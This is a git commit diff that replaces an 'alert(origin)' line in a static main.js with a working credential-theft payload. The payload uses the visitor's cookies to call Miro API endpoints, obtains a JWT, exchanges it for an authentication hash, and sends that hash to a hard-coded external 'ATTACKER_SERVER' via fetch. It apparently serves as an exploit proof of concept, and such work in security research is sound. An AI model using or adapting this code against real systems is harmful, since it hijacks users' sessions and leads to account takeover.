5a4e18b442783e565555102f362f969ce5d6c4b2
Matin <157493345+MatinARJ@users.noreply.github.com>
2024-11-14 13:52:41 +0330

    Update main.js

--- developer-hub/static/js/main.js
+++ developer-hub/static/js/main.js
@@ -1,1 +1,41 @@
-alert(origin)
+const ATTACKER_SERVER = "https://matinarjo.ir"; // Write your server address here
+
+const getJwt = function () {
+  return new Promise((resolve) => {
+    const xhr = new XMLHttpRequest();
+    xhr.open(
+      "POST",
+      "https://api.meet.miro.com/api/v1/public/miro/auth/jwt/generate"
+    );
+    xhr.withCredentials = true;
+    xhr.addEventListener("readystatechange", function () {
+      if (xhr.readyState === xhr.DONE) {
+        const JWT = JSON.parse(xhr.responseText).jwt;
+        resolve(JWT);
+      }
+    });
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send();
+  });
+};
+
+const getAuthCookie = async function () {
+  const JWT = await getJwt();
+  const xhr = new XMLHttpRequest();
+  xhr.open(
+    "POST",
+    "https://api.meet.miro.com/api/v1/public/miro/auth/jwt/login"
+  );
+  xhr.withCredentials = true;
+  xhr.addEventListener("readystatechange", function () {
+    if (xhr.readyState === xhr.DONE) {
+      const authCookie = JSON.parse(xhr.responseText).hash;
+      fetch(ATTACKER_SERVER + "?data=" + authCookie);
+    }
+  });
+  xhr.setRequestHeader("Content-Type", "application/json");
+  const data = JSON.stringify({ jwt: JWT });
+  xhr.send(data);
+};
+
+getAuthCookie();
